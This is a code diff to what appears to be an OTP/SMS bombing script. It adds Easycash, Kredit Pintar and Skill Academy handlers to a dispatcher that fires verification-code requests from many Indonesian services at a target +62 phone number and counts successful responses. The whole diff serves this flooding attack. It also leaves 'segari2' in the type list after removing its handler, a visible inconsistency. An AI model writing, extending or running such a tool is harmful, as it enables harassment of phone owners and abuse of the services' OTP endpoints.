@@ -35,6 +35,7 @@ from handlers import (
     send_moladin_otp,send_adiraku_otp,send_tri_otp,send_bmsecure_sofia_otp,
     send_alodokter_otp,send_alomedika_otp,send_bpjs_otp,send_halodoc_otp,
     send_pinhome_otp,send_rumah123_otp,
+    send_easycash_otp,send_kreditpintar_otp,send_skillacademy_otp,
 )
 from targets import TARGETS
 
@@ -439,16 +440,15 @@ def process_target(api, target62, ip, idx, total):
             return success
 
         
-        elif post_type in ('tokopedia_wa','bmsecure_aci','segari2','akseleran',
+        elif post_type in ('bmsecure_aci','segari2','akseleran',
                            'irmastore','tiptip','tokoplas','toplusms','vidio','kpoin',
                            'nusasms','berprestasi','bisatopup','stockbit','misteraladin',
                            'redbus','buccheri','gabino','moladin','adiraku','tri',
                            'bmsecure_sofia','alodokter','alomedika','bpjs','halodoc',
-                           'pinhome','rumah123'):
+                           'pinhome','rumah123',
+                           'easycash','kreditpintar','skillacademy'):
             _fn_map = {
-                'tokopedia_wa':  send_tokopedia_wa_otp,
                 'bmsecure_aci':  send_bmsecure_aci_otp,
-                'segari2':       send_segari_otp2,
                 'akseleran':     send_akseleran_otp,
                 'irmastore':     send_irmastore_otp,
                 'tiptip':        send_tiptip_otp,
@@ -474,6 +474,9 @@ def process_target(api, target62, ip, idx, total):
                 'halodoc':       send_halodoc_otp,
                 'pinhome':       send_pinhome_otp,
                 'rumah123':      send_rumah123_otp,
+                'easycash':      send_easycash_otp,
+                'kreditpintar':  send_kreditpintar_otp,
+                'skillacademy':  send_skillacademy_otp,
             }
             code, text = _fn_map[post_type](target62)
             if code in [200, 201, 202]:
